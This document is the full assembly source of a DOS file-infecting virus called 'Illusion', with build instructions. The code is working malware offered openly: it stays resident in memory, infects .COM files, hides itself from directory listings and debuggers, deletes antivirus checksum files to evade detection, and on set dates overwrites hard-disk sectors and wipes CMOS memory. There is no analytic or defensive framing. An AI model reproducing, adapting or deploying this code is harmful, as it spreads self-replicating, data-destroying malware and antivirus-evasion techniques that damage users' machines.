   ; Virus Name:  Illusion
   ; Author    :  ThE_TaChE
   ; Origin    :  México, 2006.
   ; Lenght    :  1332 bytes ( 666 * 2 )   };-)


   ; Illusion is my first released virus , it`s lame  .. i know, and is not
   ; optimized at all , but i write this virus just to test my "Full Thunderbyte
   ; Stealth" tutorial , tested under TBAV v8.0 with magnific results .. 0 flags
   ; in high-heuristic sensibility ..... hope Veldams enjoy it ;-).
   ;
   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³  Features  ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ; -Memory Resident (MCB)
   ; -Infects .COM files except COMMAND.COM  on Executing (4Bh) and Chmod (43h)
   ; -Tunneling routine tracing under the PSP.
   ; -Anti-Debug and Emulation Code.
   ; -Fools "F-POTATOE Stealth Detection" and disable Stealth when a compress
   ;  util are running.
   ; -Hook Int 24h to hide errors.
   ; -Delete CRC Checksums ( In current DIR )
   ;
   ;    -> anti-vir.dat
   ;    -> avp.crc
   ;    -> chklist.tav
   ;    -> chklist.ms
   ;    -> ivb.ntz
   ;    -> smartchk.cps
   ;
   ;
   ;Thx go to:    All 29A staff and all the channels #virus
   ;
   ;Fucks go to:  Well , they know who they are.
   ;
   ;
   ;
   ;     ThE_TaChE
   ; tache.525@hotmail.com
   ;
   ;
   ;-=[ "Information is the greatest weapon of power to the modern wizard." ]=-

   ;
   ; To assembly:  TASM /M Illusion.ASM
   ;               TLINK Illusion
   ;               EXE2COM Illusion.EXE Illusion.COM


                 .286
          Illusion       segment byte public
                 assume  cs:Illusion,ds:Illusion
                 org     0h


   Illusion_size      equ     (Illusion_end-Illusion_start)

   Illusion_start     label   byte


   ;*****************************************************************************
   ;                        CALCULATE DELTA-OFFSET                              *
   ;*****************************************************************************

   Virus_Illusion:
              call    Delta_offset

   Delta_offset:
              mov     si,sp
              mov     bp,word ptr ss:[si]
              sub     bp,offset delta_offset           ;Get ê-Offset
              add     sp,2

              call    Disable_KB                       ;Turn off Keyboard !

   ;*****************************************************************************
   ;                   ANTI-DEBUG/EMULATION TRICK                               *
   ;*****************************************************************************

   Fuck_TRACE:
              push    bx
              pop     ax
              dec     sp
              dec     sp
              pop     ax
              cmp     ax,bx                            ;Are we beging
              je      Check_for_TSR                    ;Traced?
              hlt
              int     19h                              ;!! FUCK OFF !!

   ;*****************************************************************************
   ;                         CHECK FOR TSR                                      *
   ;*****************************************************************************

   Check_for_TSR:
              mov     ax,3066h                         ;Check if we are TSR
              int     21h

              cmp     ax,555h                          ;Are we already
              jne     Check_Date                       ;memory resident ?
              jmp     Return_File

   ;*****************************************************************************
   ;                        GET-DATE  ROUTINE                                   *
   ;*****************************************************************************

   Check_Date:
              mov     ah,2bh                           ;Get Date
              dec     ah
              int     21h
              cmp     dh,07h
              jne     Check_Date2
              cmp     dl,04h                           ;It`s our time ?
              jne     Check_Date2
              jmp     PAYLOAD                          ;Go to PAYLOAD !!

   Check_Date2:
              cmp     al,02h
              jne     Tunnel_21h                       ;More dates !
              cmp     dl,05h
              jne     Tunnel_21h
              jmp     PAYLOAD                          ;Go to PAYLOAD !!

   Illusion_LiveS db '->#ThE_WiZArD'

   ;*****************************************************************************
   ;                     TUNNEL INT21h TRACING THE PSP                          *
   ;*****************************************************************************

   Tunnel_21h:
              mov     ax,3621h
              dec     ah
              int     21h                              ;Get INT 21h Vector
              mov     word ptr cs:[OldInt21h][bp],bx
              mov     word ptr cs:[OldInt21h+2][bp],es ;Save it
              mov     word ptr cs:[Tunnel21h][bp],bx
              mov     word ptr cs:[Tunnel21h][bp],es
              push    ds
              nop
              lds     bx,ds:[0006h]

   Tracear:
              nop
              cmp     byte ptr ds:[bx],0eah            ;JMP FAR ?
              jne     Chekear
              lds     bx,ds:[bx+1]
              cmp     word ptr ds:[bx],9090h           ;Double Nop ?
              jnz     Tracear
              sub     bx,32h
              cmp     word ptr ds:[bx],9090h           ;Double Nop ?
              nop
              jne     Chekear
   Hallado:
              mov     cs:[bp+word ptr Tunnel21h],bx    ;OK , We found it !!
              mov     cs:[bp+word ptr Tunnel21h+2],ds
              nop
              jmp     short Install_MCB
   Chekear:
              cmp     word ptr ds:[bx],2e1eh
              jnz     Install_MCB
              add     bx,25h
              cmp     word ptr ds:[bx],80fah
              je      Hallado

   ;*****************************************************************************
   ;                        ROUTINE TO GO TSR                                   *
   ;*****************************************************************************
   Install_MCB:
              pop     ds

              mov     ax,ds
              dec     ax
              mov     ds,ax                            ;Program's MCB segment
              xor     di,di

              cmp     byte ptr ds:[di],'Y'             ;Is it a Z block?
              ja      MCB_OK                           ;YES !!
              jmp     Return_File                      ;No .. Exit ..

   MCB_OK:        sub     word ptr ds:[di+3],((Illusion_Size/10h)+2)
              sub     word ptr ds:[di+12h],((Illusion_Size/10h)+2)
              add     ax,word ptr ds:[di+3]
              inc     ax

              mov     ds,ax
              mov     byte ptr ds:[di],'Z'             ;Mark block as Z
              mov     word ptr ds:[di+1],8             ;System memory
              mov     word ptr ds:[di+3],((Illusion_Size/10h)+1)
              mov     word ptr ds:[di+8],4f44h         ;Mark block as owned
              mov     word ptr ds:[di+0ah],0053h       ;by DOS (444f53h,0)
              inc     ax

              cld
              push    cs
              pop     ds
              mov     es,ax
              mov     cx,Illusion_SiZe                 ;Copy virus to memory
              mov     si,bp
              rep     movsb

   ;*****************************************************************************
   ;                        SET INTERRUPTION 21H                                *
   ;*****************************************************************************
   Set_int21h:
              mov     ds,cx
              mov     si,22h*4                         ;Original vector

              cli
              mov     word ptr [si-4],offset INT21_Illusion
              mov     word ptr [si-2],ax               ;Set ours
              sti

   Return_File:
              push    cs cs
              pop     ds es

              call    Enable_KB                        ;Enables Keyboard


   ;*****************************************************************************
   ;                   RESTORE .COM file AND SET REGISTERS = 0                  *
   ;*****************************************************************************

   Exit_COM:
              lea     si,[bp+offset Buffer_COM]        ;SI points to original
                               ;start
              push    100h
              pop     di                               ;Save DI to Stack to
              push    di                               ;return to program ...
              movsw                                    ;Copy three bytes
              movsb

   Reset_Reg:
              xor     ax,ax
              xor     bx,bx                            ;Set registers to 0
              xor     dx,dx
              xor     di,di
              xor     si,si
              xor     bp,bp

              ret                                      ;Return to host

   ;*****************************************************************************
   ;                         DISABLE KEYBOARD                                    *
   ;*****************************************************************************

   Disable_KB:
              in      al,21h
              or      al,00000010b
              out     21h,al                           ;Disable KeyBoard
              ret

   ;*****************************************************************************
   ;                         ENABLE KEYBOARD                                    *
   ;*****************************************************************************

   Enable_KB:
              in      al,21h                           ;Enable KeyBoard
              and     al,not 2
              out     21h,al
              ret


   ;*****************************************************************************
   ;                               FCB STEALTH                                  *
   ;*****************************************************************************

   Fcb_Stealth:
              xchg    ax,bx
              pushf
              call    dword ptr cs:[OldInt21h]         ;Call to INT 21h
              test    al,al                            ;Error ?
              jnz     fcb_out                          ;Jmp if error

              push    ax bx cx es                      ;Save registers

              mov     ah,51h                           ;Get current psp
              int     21h

              mov     es,bx                            ;Es=segment of psp
              cmp     bx,es:[16h]                      ;psp of COMMAND.COM?
              jnz     fcb_out1                         ;no, then jmp
              mov     bx,dx                            ;DS:BX=FCB
              mov     al,[bx]                          ;1st byte of fcb
              push    ax                               ;save it
              mov     ah,2fh                           ;get DTA in ES:BX
              int     21h

              pop     ax                               ;get first byte
              inc     al                               ;al=ffh therefor al=ZR
              jnz     fcb_old                          ;if != ZR jmp
              add     bx,7h                            ;extended fcb here, +7

   fcb_old:
              cmp     word ptr es:[bx+09h],'OC'        ;It`s a .COM file ?
              jne     Fcb_out1

              mov     ax,es:[bx+17h]                   ;Get file time stamp
              mov     cx,es:[bx+19h]                   ;Get file date stamp
              and     ax,1fh                           ;Unmask seconds field
              and     cx,1fh                           ;Unmask day of month
              xor     ax,cx                            ;Are they equal?
              jnz     fcb_out1                         ;Nope, exit ...
              sub     word ptr es:[bx+1dh],Illusion_Size ;sub away virus_size
              sbb     word ptr es:[bx+1fh],0           ;Sub with carry flag

   fcb_out1:      pop     es cx bx ax                      ;Restore registers

   fcb_out:       iret                                     ;Return control


   ;*****************************************************************************
   ;                            NEW INTERRUPT 21h                               *
   ;*****************************************************************************

   Int21_Illusion:
              cmp     ax,3066h
              jne     Int21_Check

              mov     ax,0555h                         ;Return AX=555 !!!
              iret

   Int21_Check:
              xchg    ax,bx                            ;Anti-heuristics(TBAV)
              cmp     bh,11h
              je      Fcb_Stealth                      ;FCB Stealth
              cmp     bh,12h
              je      Fcb_stealth
              cmp     bh,4eh
              je      HANDLE_stealth                   ;HANDLE Stealth
              cmp     bh,4fh
              je      HANDLE_stealth
              cmp     bx,4B00h                         ;Execute
              je      Infectar
              cmp     bh,43h                           ;Chmod
              je      Infectar
              xchg    ax,bx                            ;Restore this

   ExitInt21:     db   0eah                                ;Exit ...
   Oldint21h      dw   ?,?                                 ;Old Int 21h

   ExitTun21:     db   0eah
   Tunnel21h      dw   ?,?                                 ;Tunneled Int 21h

   ;*****************************************************************************
   ;                             HANDLE STEALTH                                 *
   ;*****************************************************************************

   HANDLE_Stealth:
              xchg  ax,bx
              pushf
              call  DWORD ptr cs:[OldInt21h]            ;Call to INT 21h
              jnc   Handle_OK

              stc
              retf  02h
   Handle_OK:
              push  ax bx cx dx es                      ;Save registers

              mov   ah,62h
              pushf
              call  DWORD ptr cs:[OldInt21h]               ;Call to INT 21h

              dec   bx
              mov   es,bx
              mov   ax,word ptr es:[0008h]

              cmp   ax,"-F"                             ;F-PROT (Fuck POTATOE)
              jz    not_infected

              cmp   ax,"RA"                             ;ARJ
              jz    not_infected

              cmp   ax,"AR"                             ;RAR
              je    not_infected

              cmp   ax,"KP"                             ;PK*
              je    not_infected

              mov   ah,2Fh                              ;get DTA
              pushf
              call  DWORD ptr cs:[OldInt21h]            ;Call to INT 21h

              mov   ax,es:[bx+16h]                      ;Get file time stamp
              mov   cx,es:[bx+18h]                      ;Get file date stamp
              and   ax,1fh                              ;Unmask seconds field
              and   cx,1fh                              ;Unmask day of month
              cmp   ax,cx                               ;Are they equal
              jne   not_infected

              cmp   ax,1eh
              jb    Hnd_Sub

              and   byte ptr es:[bx+16h],0E0h           ;Erase erroneous sec.

   HnD_Sub:
              sub   word ptr es:[bx+1Ah],Illusion_size  ;Sub virus size
              sbb   word ptr es:[bx+1ch],0              ;Sub with carry flag

   not_infected:
              pop   es dx cx bx ax
              clc
              retf  02h

   ;*****************************************************************************
   ;                         RUTINE TO INFECT                                   *
   ;*****************************************************************************

   Infectar:
              xchg    ax,bx

              push    ax bx cx dx                      ;Save this Shit ;-)
              push    si di es ds

              call    Disable_KB                       ;Turn off Keyboard

   Check_File:
              cld                                      ;Check extension
              mov     di,dx                            ;for COM
              push    ds
              pop     es
              mov     al,'.'                           ;Search extension
              repne   scasb
   Check_COM:
              cmp     word ptr es:[di],'OC'            ;Check 'CO'
              jne     No_GOOD                          ;and
              cmp     byte ptr es:[di+2],'M'           ;Check 'M'
              jne     No_GOOD


   Check_COMMAND:
              cmp     word ptr es:[di-4],'NA'          ;COMMAND.COM ?
              jne     Continue

   No_GOOD:
              call    Delete_CRC                       ;Delete CRC files !!
              jmp     restore                          ;No .COM or COMMAND.COM


   Continue:
              call    set_Int_24h                      ;Set New Int 24h

              mov     ax,4300h                         ;Get file Attribs
              call    Call_Tun21h

              push    cx                               ;Save it

              test    cl,1h                            ;Make sure there normal
              jz      open_file                        ;Okay there are
              and     cl,0feh                          ;Nope, Fix them...
              mov     ax,4300h                         ;Save them now
              inc     ax                               ;AX=4301h (TBAV :-P )
              call    Call_Tun21h
              jc      No_GOOD

   Open_file:
              mov     ax,3D02h                         ;Open file
              call    Call_Tun21h

              jc      No_GOOD

   Check_Infect:
              xchg    ax,bx                            ;BX File handler

              push    dx

              mov     ax,5700h                         ;Get file TIME + DATE
              call    Call_Tun21h

              mov     word ptr cs:[old_time],cx        ;Save file time
              mov     word ptr cs:[old_date],dx        ;Save file date

              and     cx,1fh                           ;Unmask second field
              and     dx,1fh                           ;Unmask date field
              xor     cx,dx                            ;are they equal?
              jz      Exit_Close                       ;File infected


   exec_time_ok:
              and     word ptr cs:[old_time],0ffe0h    ;Reset second bits
              or      word ptr cs:[old_time],dx        ;Seconds=day of month

              push    cs
              pop     ds

              mov     ah,3fh
              mov     cx,3
              mov     dx,offset ds:[Buffer_COM]        ;Read first 3 bytes
              Call    Call_Tun21h

              mov     al,02h                           ;Lseek to end
              call    Move_pointer

              cmp     byte ptr ds:[Buffer_COM],'M'
              je      Exit_Close

              cmp     byte ptr ds:[Buffer_COM+2],'Z'   ;Is file an EXE?
              je      Exit_Close                       ;Exit !

              cmp     ax,0fa00h                        ;COM > 64K ?
              jae     Exit_Close                       ;No sorry ...

              mov     cx,ax
              sub     cx,3                             ;Set the JMP
              mov     word ptr cs:[jump_address+1],cx

              mov     ah,3Fh                           ;Write Virus
              inc     ah
              mov     dx,offset Illusion_Start
              mov     cx,Illusion_Size                 ;Virus size
              call    Call_Tun21h

              mov     al,00h                           ;Lseek to start
              call    Move_pointer

              mov     ah,3Fh                           ;Write back the first
              inc     ah
              mov     dx,offset ds:[jump_address]      ;3 bytes
              mov     cx,3h
              Call    Call_Tun21h
   Exit_Res:
              mov     cx,word ptr ds:[old_time]        ;Restore file time
              mov     dx,word ptr ds:[old_date]        ;Restore file date
              mov     ax,5700h
              inc     ax                               ;AX=5701h (TBAV :-P )
              call    Call_tun21h

   Exit_Close:
              mov     ah,3Eh                           ;Close file
              Call    Call_Tun21h

   Res_Att:
              push    es
              pop     ds

              pop     dx
              pop     cx
              mov     ax,4300h                         ;Restore Atributes
              inc     ax
              call    Call_Tun21h
              call    Reset_Int_24h                    ;Reset Int24h

   Restore:
              call    Enable_KB                        ;Restore Keyboard

              pop     ds es di si                      ;Restore this shit !
              pop     dx cx bx ax

              jmp     ExitInt21                        ;Exit ...


   Old_date       dw      0                                ;File date
   Old_time       dw      0                                ;File time
   Jump_address   db      0E9h,90h,90h                     ;JMP Address
   Buffer_COM     db      0CDh,020h,90h                    ;Original 3 bytes


   ;*****************************************************************************
   ;                       RUTINE TO MOVE POINTER                               *
   ;*****************************************************************************

   Move_pointer:
              mov     ah,42H
              xor     cx,cx                            ;CX=0
              cwd                                      ;DX=0
              call    Call_Tun21h
              ret


   ;*****************************************************************************
   ;                      RUTINE TO CALL INT_21h TUNNELED                       *
   ;*****************************************************************************

   Call_Tun21h:
              pushf
              call    DWORD PTR cs:[Tunnel21h]         ;Call FAKE Int 21h
              ret

   ;*****************************************************************************
   ;                           DELETE CRC FILES                                 *
   ;*****************************************************************************

   delete_crc     proc    near

              push    ax cx dx ds

              push    cs
              pop     ds

              xor     cx,cx

              lea     dx,kill_msav                     ;Chklist.ms
              call    kill_crc_files

              lea     dx,kill_tbav
              call    kill_crc_files

              lea     dx,kill_smartchk                 ;Smartchk.cps
              call    kill_crc_files

              lea     dx,kill_avp                      ;Avp.crc
              call    kill_crc_files

              lea     dx,kill_ivb                      ;Ivb.ntz
              call    kill_crc_files

              lea     dx,kill_chklist                  ;Chklist.tav
              call    kill_crc_files

   Exit_Delete:   pop     ds dx cx ax
              retn

   kill_crc_files:
              mov     ax,4300h                         ;Clear Atributes
              inc     ax
              call    Call_Tun21h

              mov     ah,41h                           ;Delete File
              call    Call_Tun21h
              retn
              endp

   ;*****************************************************************************
   ;                             SET NEW INT24h                                 *
   ;*****************************************************************************

   Set_int_24h:
              push    ax si di
              push    ds es

              xor     ax,ax                            ;Point to the IVT
              mov     ds,ax

              push    cs                               ;CS=ES
              pop     es

              mov     si,24h*4                         ;Save the original int
              mov     di,offset oldint24h              ;24h address
              cld
              movsw
              movsw

              mov     word ptr [si-4],offset Newint24h
              mov     word ptr [si-2],cs               ;Set ours !

              pop     es ds
              pop     di si ax
              ret

   ;*****************************************************************************
   ;                            RESTORE OLD INT24h                              *
   ;*****************************************************************************

   Reset_int_24h:
              push    ax si di
              push    ds es

              xor     ax,ax                            ;Point to the IVT
              mov     es,ax

              push    cs                               ;CS=DS
              pop     ds

              mov     si,offset Oldint24h              ;Restore the original
              mov     di,24h*4                         ;Int 24h address
              cld
              movsw
              movsw

              pop     es ds
              pop     di si ax
              ret

   ;*****************************************************************************
   ;                             NEW INT 24h                                    *
   ;*****************************************************************************

   Newint24h:
              mov     al,3                             ;Pass the error code
              iret

   Oldint24h      dw      ?,?                              ;Original int 24h


   ;*****************************************************************************
   ;                       DATA ABOUT ANTI-ANTIVIRUS                            *
   ;*****************************************************************************

   ; CRC files to delete!

   kill_tbav      db      'ANTI-VIR.DAT',0
   kill_msav      db      'CHKLIST.MS',0
   kill_smartchk  db      'SMARTCHK.CPS',0
   kill_avp       db      'AVP.CRC',0
   kill_ivb       db      'IVB.NTZ',0
   kill_chklist   db      'CHKLIST.TAV',0



   ;*****************************************************************************
   ;                        !! ACTIVATION ROUTINE !!                            *
   ;*****************************************************************************

   PAYLOAD:
              mov     si,bp
              mov     ax,0002h                         ;Clear Screen
              int     10h

   PREP_VIDEO:
              mov     ah,13h                           ;Set values
              mov     al,0
              mov     bh,0
              mov     bl,14
              mov     cx,60
              mov     dh,8                             ;Line
              mov     dl,09                            ;Position
              lea     bp,[si+offset MENSAJE]
              int     10h                              ;Print messagge

              mov     bl,0fh
              mov     cx,45
              mov     dh,11
              mov     dl,16
              lea     bp,[si+offset MENSAJE2]          ;Messagge
              int     10h                              ;Print messagge

              mov     cx,39
              inc     dh
              lea     bp,[si+offset MENSAJE3]          ;Messagge
              int     10h                              ;Print messagge

              mov     cx,44
              inc     dh
              lea     bp,[si+offset MENSAJE4]          ;Messagge
              int     10h                              ;Print messagge


   ;*****************************************************************************
   ;                         DESTROY THE HARDDISK                               *
   ;*****************************************************************************

   Rip_hd:
              xor     dx, dx                           ;Clear dx
   Rip_hd1:
              mov     cx, 1                            ;Track 0, sector 1
              push    0311h                            ;17 secs per track
              pop     ax
              mov     dl, 80h
              mov     bx, 5000h
              mov     es, bx
              int     13h                              ;Kill 17 sectors
              jae     rip_hd2
              xor     ah, ah
              int     13h                              ;Reset disks if needed
   Rip_hd2:
              inc     dh                               ;Increment head number
              cmp     dh, 4                            ;If head number is below 4
              jb      rip_hd1                          ;then go kill another 17
              inc     ch                               ;sectors increase track
              cmp     ch,99h                           ;number ...  99 tracks ?
              jb      rip_hd

   ;*****************************************************************************
   ;                         NOW DESTROY THE CMOS                               *
   ;*****************************************************************************

   kill_cmos1:    mov     bp,7C00h
              mov     cx,40h

   kill_cmos2:    mov     al,cl
              out     70h,al                           ;CMOS !!
              xor     al,al
              out     71h,al                           ;Overwrite CMOS with 0 !!
              loop    kill_cmos2
              jmp     $


   MENSAJE    DB 'ÄÄ  IlluSioN  viRus coded by ThE_TaChE in México (2006)  ÄÄ '
   MENSAJE2   DB 'When you know that your time is close at hand'
   MENSAJE3   DB 'Maybe then you will begin to understand'
   MENSAJE4   DB 'Life down there is just a strange Illusion ...'

   Illusion_end   label   byte
   Illusion      ends
          end     Illusion_start
